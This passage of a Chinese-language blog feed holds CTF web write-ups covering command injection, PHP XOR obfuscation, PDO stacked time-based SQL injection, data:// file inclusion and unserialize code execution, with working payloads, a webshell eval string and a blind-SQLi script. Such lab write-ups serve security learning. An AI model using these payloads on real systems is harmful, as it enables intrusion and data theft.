class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $filename;$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  <span class="hljs-comment">//systemå‘½ä»¤æ‰§è¡Œï¼ŒæŠ“åŒ…æ”¹filenameå³å¯</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payloadï¼š</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>æˆ–è€…*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`ls /|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d` cat /flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;N1CTF-2018-eating-cms&quot;&gt;&lt;a href=&quot;#N1CTF-2018-eating-cms&quot; class=&quot;headerlink&quot; title=&quot;[N1CTF 2018]eating_cms&quot;&gt;&lt;/a&gt;[N1CTF 2018]eating_cms</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/categories/CTF/rce/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>å¼‚æˆ–^</title>
    <link href="http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <id>http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/</id>
    <published>2021-07-13T23:47:42.000Z</published>
    <updated>2021-08-01T04:44:17.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h1><p>å¼‚æˆ–å°±æ˜¯äºŒè¿›åˆ¶å¯¹åº”ä½ä¸Šè¿ç®—ï¼š   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ffå¯¹åº”çš„æ˜¯åè¿›åˆ¶çš„255ï¼ŒäºŒè¿›åˆ¶å°±æ˜¯<code>111111111</code>,æ‰€ä»¥å®ƒä¸å…¶ä»–å¼‚æˆ–åå†ä¸åŸæ¥çš„å¼‚æˆ–å°±ç­‰äºåŸæ¥çš„<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##è¦å¼‚æˆ–çš„</span>temp=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></code></pre><p><code>phpinfo</code>â€”-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>â€”-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(æ¯ä¸€éƒ¨åˆ†éƒ½è¦æ‹¬èµ·æ¥)     </p><h2 id="æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯"><a href="#æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯" class="headerlink" title="æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯"></a>æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„è¯</h2><p>æ¯”å¦‚:    </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></code></pre><p>è¿™ä¸ªæ˜¯é™å®šæ‰€ç”¨çš„å­—ç¬¦ç§ç±»å°äºæˆ–ç­‰äº13       </p><p>çœ‹çœ‹æœ‰æ²¡æœ‰é‚£ä¸ªå­—ç¬¦å¯ä»¥ç”±å…¶å®ƒçš„å¼‚æˆ–è€Œæ¥    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):                        <span class="hljs-keyword">continue</span>                    <span class="hljs-keyword">else</span>:                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></code></pre><p>è¿™é‡Œç”¨ä¸‰ä¸ªæ¥å¼‚æˆ–ä¸€ä¸ªï¼Œä¸¤ä¸ªçš„è¯å¤ªå°‘ï¼Œä¸è¡Œ<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>éšä¾¿é€‰ä¸‰ä¸ª   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>â€”&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>â€”-&gt;åŠ ä¸Šä¸¤ä¸²<code>(%ff%ff%ff%ff%ff%ff%ff)</code>â€”&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>â€”â€“&gt;å°†å¯¹åº”ä½ç½®ä¸Šçš„å­—ç¬¦ä¿®æ”¹ï¼Œæ¯”å¦‚<code>i</code>åœ¨ç¬¬ä¸‰ä½ï¼Œå°±æŠŠå‰ä¸‰ä¸²çš„ç¬¬ä¸‰ä½æ”¹æˆ<code>c n d</code>å¯¹åº”çš„<code>%9c %91 %9b</code>â€”-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandirä¹Ÿæ¢å     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>åŸæœ¬åäº”ä¸ªï¼ŒåŠ ä¸Š<code>%ff</code>ï¼Œåå…­ä¸ªï¼Œå‡ä¸‰ï¼Œåä¸‰ä¸ª</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¼‚æˆ–&quot;&gt;&lt;a href=&quot;#å¼‚æˆ–&quot; class=&quot;headerlink&quot; title=&quot;å¼‚æˆ–&quot;&gt;&lt;/a&gt;å¼‚æˆ–&lt;/h1&gt;&lt;p&gt;å¼‚æˆ–å°±æ˜¯äºŒè¿›åˆ¶å¯¹åº”ä½ä¸Šè¿ç®—ï¼š   &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1^1=0  
1^0=1
0^0=0   &lt;/code&gt;&lt;/pre&gt;
&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/categories/CTF/or-or/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="knowledge" scheme="http://lll-nnn.github.io/tags/knowledge/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/tags/or-or/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lll-nnn.github.io/2021/07/11/BUU89/"/>
    <id>http://lll-nnn.github.io/2021/07/11/BUU89/</id>
    <published>2021-07-11T14:58:38.589Z</published>
    <updated>2021-07-14T01:07:07.341Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•æ¡†<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burpæŠ“åŒ…åŠ ä¸ª<code>&#39;</code>å‘ç°æŠ¥é”™<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sqlæ³¨å…¥äº†ï¼Œä¸è¿‡æŠ¥é”™æ˜¾ç¤ºçš„æ˜¯<code>fetch()</code>å‡½æ•°é”™è¯¯     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDOä¸‹çš„SQLæ³¨å…¥</code></a><br>PDOâ€”&gt;phpæ•°æ®å¯¹è±¡       </p><p>PDOæ”¯æŒå¤šè¯­å¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯å †å æ³¨å…¥      </p><p>PDOä¸­çš„query()å‡½æ•°åŒæ•°æ®åº“äº¤äº’</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbms=<span class="hljs-string">&#x27;mysql&#x27;</span>;$host=<span class="hljs-string">&#x27;192.168.27.61&#x27;</span>;$dbName=<span class="hljs-string">&#x27;test&#x27;</span>;$user=<span class="hljs-string">&#x27;root&#x27;</span>;$pass=<span class="hljs-string">&#x27;root&#x27;</span>;$dsn=<span class="hljs-string">&quot;<span class="hljs-subst">$dbms</span>:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$dbName</span>&quot;</span>;<span class="hljs-keyword">try</span> &#123;    $pdo = <span class="hljs-keyword">new</span> PDO($dsn, $user, $pass);&#125; <span class="hljs-keyword">catch</span> (PDOException $e) &#123;    <span class="hljs-keyword">echo</span> $e;&#125;$sql = <span class="hljs-string">&quot;select * from user where id=1;&quot;</span>;$sql .= <span class="hljs-string">&quot;create table test2 like user&quot;</span>;$stmt = $pdo-&gt;query($sql);<span class="hljs-keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;    var_dump($row);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;</code></pre></code></pre><p>prepareé¢„å¤„ç†      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>ä»¥æ­¤ç»“åˆåå…­è¿›åˆ¶æ³¨å…¥    </p><p>æ‰¾äº†WPçš„è„šæœ¬ï¼Œä½†è·‘ä¸å‡ºæ¥-_-</p><pre><code><pre><code class="hljs python">    <span class="hljs-comment">#author: c1e4r</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">import</span> json    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>        <span class="hljs-comment">#é¢˜ç›®åœ°å€</span>        url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span>        <span class="hljs-comment">#æ³¨å…¥payload</span>        payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span>        flag = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            <span class="hljs-comment">#æŸ¥è¯¢payload</span>            payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):                <span class="hljs-comment">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span>                datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;                data = json.dumps(datas)                times = time.time()                res = requests.post(url = url, data = data)                <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:                    flag = flag + <span class="hljs-built_in">chr</span>(j)                    print(flag)                    <span class="hljs-keyword">break</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        main()    ```  å¾—åˆ°`glzjin_wants_a_girl_friend.<span class="hljs-built_in">zip</span>`æºç      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/b7c5c05c1929a09f.png)     `å‰ç«¯åº”ç”¨é€»è¾‘çš„åŸºç¡€åœ¨ controller æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œè€Œå…¶ä»–æ–‡ä»¶éƒ½æ˜¯åŸºäº basecontroller.php æ‰€ä»¥æˆ‘ä»¬æ‰“å¼€ basecontroller.php æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡`          ```php    private $viewPath;        public function loadView($viewName =<span class="hljs-string">&#x27;&#x27;</span>, $viewData = [])        &#123;            $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;            if(file_exists($this-&gt;viewPath))            &#123;                extract($viewData);                include $this-&gt;viewPath;            &#125;        &#125;</code></pre></code></pre><p><code>extract</code>å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–     </p><p>æ‰¾åˆ°<code>UserController.php</code>ä¸­è°ƒç”¨äº†<code>loadView</code>ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯æ§      </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $params = $_REQUEST;        $userModel = <span class="hljs-keyword">new</span> UserModel();        $listData = $userModel-&gt;getPageList($params);        <span class="hljs-keyword">$this</span>-&gt;loadView(<span class="hljs-string">&#x27;userList&#x27;</span>, $listData );    &#125;</code></pre></code></pre><p>åœ¨<code>userindex.php</code>ä¸­</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($img_file)) &#123;    $img_file = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;&#125;$img_dir = dirname(<span class="hljs-keyword">__FILE__</span>) . $img_file;$img_base64 = imgToBase64($img_dir);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;</code></pre></code></pre><p>æ‰€ä»¥ä¼ å…¥<code>img_file=/../flag.php</code>   </p><p>éœ€è¦å…ˆè¿›å…¥<code>userIndex.php</code>ï¼Œurlä¸­ä¿®æ”¹<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>æºç ä¸­å›¾ç‰‡base64è§£ç å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title:  [SWPU2019]Web4&lt;br&gt;date:  2021-07-11 22:58:38&lt;br&gt;tags:  [CTF,WP,sql]&lt;br&gt;categories:  [CTF,sql]&lt;br&gt;index_img:  /img/0016.png&lt;b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CJBCTF</title>
    <link href="http://lll-nnn.github.io/2021/07/11/CJBCTF/"/>
    <id>http://lll-nnn.github.io/2021/07/11/CJBCTF/</id>
    <published>2021-07-11T02:38:49.000Z</published>
    <updated>2021-07-11T13:36:01.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>æ–‡ä»¶åŒ…å«</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];    &#125;&#125;</code></pre></code></pre><p><code>pathinfo</code>è¦æ±‚ä¼ å…¥çš„<code>file</code>åç¼€åä¸º<code>php</code>ï¼Œå°±ä¼š<code>include</code>      </p><p>çœ‹åˆ°includeè¦æƒ³åˆ°ä¼ªåè®®äº†    </p><p>è¿™é‡Œç”¨<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>å¾—åˆ°flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>ä»£ç å®¡è®¡</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;        &#125;        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        var_dump($safe);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;        unserialize($info);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $hacker=<span class="hljs-keyword">new</span> Hacker();    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><ul><li><p>ç¬¬ä¸€ç§æ€è·¯ï¼šåœ¨ç±»ä¸­å†™ä¸¤æ¬¡ç›¸åŒçš„å±æ€§åï¼Œåé¢çš„å±æ€§å€¼ä¼šè¦†ç›–å‰é¢çš„å±æ€§å€¼ï¼ˆç±»çš„å±æ€§ä¸ªæ•°è¦åŠ 1ï¼‰<br>  <code>\([^()]*\([^()]*\)</code>è¿™æ¡æ­£åˆ™è¿‡æ»¤çš„æ—¶æ‹¬å·åµŒå¥—<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>ç¬¬äºŒç§æ€è·¯ï¼šåˆ©ç”¨<code>$safe</code><br>  æ ¹ç›®å½•payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>è¿™æ ·ç©¿è¶Šç›®å½•tql   </p><p>  è¯»flagpayloadï¼š<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink&quot; title=&quot;warmup&quot;&gt;&lt;/a&gt;warmup&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;æ–‡ä»¶åŒ…å«&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&lt;pre&gt;&lt;code class=&quot;hlj</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="CJBCTF" scheme="http://lll-nnn.github.io/tags/CJBCTF/"/>
    
  </entry>
  
  <entry>
    <title>Newctf</title>
    <link href="http://lll-nnn.github.io/2021/06/02/newctf/"/>
    <id>http://lll-nnn.github.io/2021/06/02/newctf/</id>
    <published>2021-06-02T14:48:05.000Z</published>
    <updated>2021-06-02T15:06:52.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2021-6-1èŒæ–°èµ›-easy-web"><a href="#2021-6-1èŒæ–°èµ›-easy-web" class="headerlink" title="2021.6.1èŒæ–°èµ›-easy_web"></a>2021.6.1èŒæ–°èµ›-easy_web</h2><p>hint:è¿™ä¸ªå›¾ç‰‡çœŸå¥½çœ‹å‘€ï¼Œæ²¡å•¥éšè—çš„ä¸œè¥¿å§    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>ç¬¬ä¸€ç‚¹ï¼š<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>è¿™ä¸€ä¸²æ˜¯123456çš„MD5       </p><p>ç¬¬äºŒç‚¹ï¼š<code>===</code>å¯ä»¥æ•°ç»„ç»•è¿‡        </p><p>ç¬¬ä¸‰ç‚¹ï¼š<code>$array[++$c]=1</code>æ•°ç»„ç´¢å¼•æº¢å‡ºï¼Œ<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>è¿”å›ï¼š   </p><pre><code>ä½ è§‰å¾—å°±è¿™ä¹ˆç®€å•å—ï¼Ÿï¼Ÿï¼Ÿï¼Œå¯ä»¥å‘Šè¯‰ä½ å¯†ç å“¦ï¼        password: xluoyyds123456@@@      </code></pre><p>ç„¶åæ˜¯ä¸€ä¸ªå›¾ç‰‡éšå†™ï¼Œä¸‹è½½ä¸‹æ¥èƒŒæ™¯å›¾ç‰‡ï¼Œåç¼€æ”¹ä¸º<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>è¾“å…¥å¯†ç å¾—åˆ°flag    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2021-6-1èŒæ–°èµ›-easy-web&quot;&gt;&lt;a href=&quot;#2021-6-1èŒæ–°èµ›-easy-web&quot; class=&quot;headerlink&quot; title=&quot;2021.6.1èŒæ–°èµ›-easy_web&quot;&gt;&lt;/a&gt;2021.6.1èŒæ–°èµ›-easy_web&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>NEEPUCTF</title>
    <link href="http://lll-nnn.github.io/2021/05/27/NEEPUCTF/"/>
    <id>http://lll-nnn.github.io/2021/05/27/NEEPUCTF/</id>
    <published>2021-05-27T14:04:57.000Z</published>
    <updated>2021-05-29T03:53:23.082Z</updated>
    
